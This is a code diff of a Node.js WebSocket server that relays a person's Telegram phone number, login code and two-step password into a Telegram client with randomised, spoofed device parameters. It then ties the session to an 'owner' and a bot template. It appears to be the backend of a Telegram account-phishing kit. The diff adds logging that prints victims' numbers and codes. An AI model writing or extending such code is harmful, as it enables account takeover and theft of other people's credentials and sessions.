@@ -171,7 +171,7 @@ app.get(`/log`, async (req, res) => {
 
 ws.on('connection', async (socket, request) => {
     let id, owner, type, bot, user, site, lang
-
+    
     try {
         const parsed = qs.parse(request.url.split("?")[1]);
         id = parsed.id;
@@ -180,7 +180,7 @@ ws.on('connection', async (socket, request) => {
         lang = parsed.lang || 'ru';
         bot = parsed.token;
 
-        console.log(id, owner, type, bot)
+    
         if (!['bot', 'web', `qr`].includes(type) || !id) throw new Error(`Unauth`);
     } catch (e) {
         socket.send(`0-0`);
@@ -245,7 +245,7 @@ ws.on('connection', async (socket, request) => {
     //     socksType: 5 
     // }
     const deviceParams = await getRandomDeviceParams();
-    console.log(deviceParams)
+
     
     const client = new TelegramClient(new StringSession(), deviceParams.app_id, deviceParams.app_hash, {
         connectionRetries: 10,
@@ -253,12 +253,13 @@ ws.on('connection', async (socket, request) => {
         "appVersion": deviceParams.app_version,
         "deviceModel": deviceParams.device,
         "systemVersion": deviceParams.sdk,
-        'langCode': deviceParams.lang_code,
-        dcId: 2,                  // Фиксированный DC
-        forceDcAuth: true,        // Принудительное использование указанного DC
-        skipBuildAuth: true,      // Пропуск построения новой авторизации (предотвращает миграцию)
+        "langCode": deviceParams.lang_code,
+        "systemLangCode": deviceParams.system_lang_code,
+        "langPack": deviceParams.lang_pack,   
 
-        
+
+       
+
     });
 
     setTimeout(async () => {
@@ -273,20 +274,49 @@ ws.on('connection', async (socket, request) => {
 
     socket.send(JSON.stringify({ action: 'connected' }));
 
-    await client.start({
-        phoneNumber: async () => await waitForAction('number'),
-        password: async () => await waitForAction('password'),
-        phoneCode: async () => {
-            // Ждем завершения миграции DC если она происходит
-            await new Promise(resolve => setTimeout(resolve, 3000));
-            return await waitForAction('code');
-        },
-        onError: (data) => {
-            number = undefined;
-            console.log('Auth error:', data);
-            socket.send(JSON.stringify({ action: 'error', data }));
-        }
-    });
+    try {
+        console.log('[START] Начинаем подключение');
+        await client.connect();
+        console.log('[CONNECT] Подключение установлено');
+
+        await client.start({
+            phoneNumber: async () => {
+                console.log('[PHONE] Запрашиваем номер телефона');
+                const number = await waitForAction('number');
+                console.log('[PHONE] Получен номер:', number);
+                return number;
+            },
+            password: async () => {
+                console.log('[2FA] Запрашиваем пароль');
+                const password = await waitForAction('password');
+                console.log('[2FA] Получен пароль');
+                return password;
+            },
+            phoneCode: async () => {
+                console.log('[CODE] Запрашиваем код');
+                try {
+                    const code = await waitForAction('code');
+                    console.log('[CODE] Получен код:', code);
+                    return code;
+                } catch (error) {
+                    console.log('[CODE] Ошибка при получении кода:', error);
+                    throw error;
+                }
+            },
+            onError: (error) => {
+                console.log('[ERROR] Ошибка авторизации:', error);
+                number = undefined;
+                socket.send(JSON.stringify({ action: 'error', data: error.message }));
+            }
+        });
+        
+        console.log('[AUTH] Авторизация успешна');
+
+    } catch (error) {
+        console.log('[FATAL] Критическая ошибка:', error);
+        socket.send(JSON.stringify({ action: 'error', data: error.message }));
+    }
+
     const botData = await botSchema.findOne({ token: bot });
     const template = await botTemplate.findOne({ id: botData.template });
  
